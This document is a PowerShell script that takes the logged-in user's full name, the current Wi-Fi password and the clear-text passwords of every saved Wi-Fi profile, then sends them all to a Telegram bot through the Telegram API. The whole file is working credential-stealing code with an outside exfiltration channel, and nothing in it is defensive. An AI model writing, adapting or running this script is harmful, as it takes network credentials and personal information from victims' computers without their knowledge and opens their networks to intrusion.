param (
    [string]$botToken,
    [string]$chatId
)

# Define Functions

function Get-fullName {
    try {
        $fullName = Net User $Env:username | Select-String -Pattern "Full Name"
        $fullName = ("$fullName").TrimStart("Full Name")
    } catch {
        Write-Error "No name was detected"
        return $env:UserName 
    }
    return $fullName 
}

function Get-Pass {
    try {
        $pro = netsh wlan show interface | Select-String -Pattern ' SSID '; $pro = [string]$pro
        $pos = $pro.IndexOf(':')
        $pro = $pro.Substring($pos+2).Trim()

        $pass = netsh wlan show profile $pro key=clear | Select-String -Pattern 'Key Content'; $pass = [string]$pass
        $passPOS = $pass.IndexOf(':')
        $pass = $pass.Substring($passPOS+2).Trim()
        
        if($pro -like '*_5GHz*') {
            $pro = $pro.Trimend('_5GHz')
        } 

        $pwl = $pass.length

        return $pass
    } catch {
        Write-Error "No network was detected" 
        return $null
    }
}

function Get-Networks {
    $WLANProfileObjects =@()
    
    $Output = netsh.exe wlan show profiles | Select-String -pattern " : "
    
    foreach($WLANProfileName in $Output){
        $WLANProfileNames = (($WLANProfileName -split ":")[1]).Trim()
        
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileNames" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
        Write-Host $WLANProfileNames $WLANProfilePassword
        $WLANProfileObject = New-Object PSCustomobject 
        $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileNames
        $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
        $WLANProfileObjects += $WLANProfileObject

    }
    return $WLANProfileObjects
}

# Call Functions

$fullName = Get-fullName
$wifiPass = Get-Pass
$networks = Get-Networks

# Craft the Message

$message = "Full Name: $fullName`n"
$message += "WiFi Password: $wifiPass`n"
$message += "Networks:`n"

foreach ($network in $networks) {
    $message += "SSID: $($network.ProfileName) - Password: $($network.ProfilePassword)`n`n"
}

# Telegram API Details

$apiUrl = "https://api.telegram.org/bot$botToken/sendMessage"

# Send the Message via Telegram

$params = @{
    chat_id = $chatId
    text    = $message
}

$response = Invoke-RestMethod -Uri $apiUrl -Method Post -ContentType "application/x-www-form-urlencoded" -Body $params

$response
